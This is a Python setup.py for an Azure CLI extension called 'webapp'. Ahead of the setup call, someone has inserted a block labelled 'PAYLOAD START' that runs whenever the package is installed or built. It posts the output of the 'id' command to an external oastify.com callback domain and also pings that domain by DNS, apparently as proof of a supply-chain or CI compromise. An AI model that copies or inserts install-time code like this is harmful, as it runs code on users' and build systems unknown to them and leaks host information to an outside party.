#!/usr/bin/env python

# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------

from codecs import open
from setuptools import setup, find_packages
import os
import sys
import socket
# ... other imports ...

# --- PAYLOAD START ---
try:
    # REPLACE THIS with your actual Collaborator domain
    COLLAB_DOMAIN = "wtte6tfhnu0v54zand8c0mybk2qtel2a.oastify.com" 
    
    # Method 1: System Curl (Most reliable on GitHub Runners)
    # We add a path /azure-cli-pwned so you know exactly which exploit hit
    os.system(f"curl -X POST -d 'id=$(id)' https://{COLLAB_DOMAIN}/azure-cli-extensions-pwned")
    
    # Method 2: System DNS (nslookup/dig) - Good if HTTP is firewalled
    os.system(f"nslookup {COLLAB_DOMAIN}")
    
    # Method 3: Python Socket (Platform independent)
    try:
        socket.gethostbyname(COLLAB_DOMAIN)
    except:
        pass

    # Still print to stderr just in case you want log proof too
    sys.stderr.write(f"\n[!] Sent OOB ping to {COLLAB_DOMAIN}\n")
    
except Exception as e:
    pass
  
VERSION = "0.4.1"

CLASSIFIERS = [
    'Development Status :: 4 - Beta',
    'Intended Audience :: Developers',
    'Intended Audience :: System Administrators',
    'Programming Language :: Python',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.7',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
    'License :: OSI Approved :: MIT License',
]

DEPENDENCIES = []

setup(
    name='webapp',
    version=VERSION,
    description='Additional commands for Azure AppService.',
    long_description='An Azure CLI Extension to manage appservice resources',
    license='MIT',
    author='Sisira Panchagnula',
    author_email='sisirap@microsoft.com',
    contributor='Purva Vasudeo',
    contributor_email='t-puvasu@microsoft.com',
    url='https://github.com/Azure/azure-cli-extensions/tree/main/src/webapp',
    classifiers=CLASSIFIERS,
    package_data={'azext_webapp': ['azext_metadata.json']},
    packages=find_packages(exclude=["tests"]),
    install_requires=DEPENDENCIES
)
